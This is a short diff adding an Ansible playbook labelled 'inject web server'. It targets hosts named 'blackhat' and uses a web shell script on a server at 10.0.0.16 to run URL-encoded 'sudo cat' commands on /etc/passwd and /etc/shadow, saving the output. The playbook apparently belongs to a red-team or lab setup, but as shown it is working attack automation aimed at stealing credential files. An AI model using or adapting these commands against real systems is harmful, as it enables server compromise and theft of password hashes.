@@ -1,0 +1,11 @@
+---
+#
+# inject web server
+#
+- name: query credentials from LDAP using the shell on web server
+  hosts: blackhat
+  tasks:
+    - name: run shell as root on web and get credentials
+      shell: php shellrun.php logs_decoded.txt 10.0.0.16/ 'sudo+cat+%2Fetc%2Fpasswd' passwd
+    - name: run shell as root on web and get credentials
+      shell: php shellrun.php logs_decoded.txt 10.0.0.16/ 'sudo+cat+%2Fetc%2Fshadow' shadow
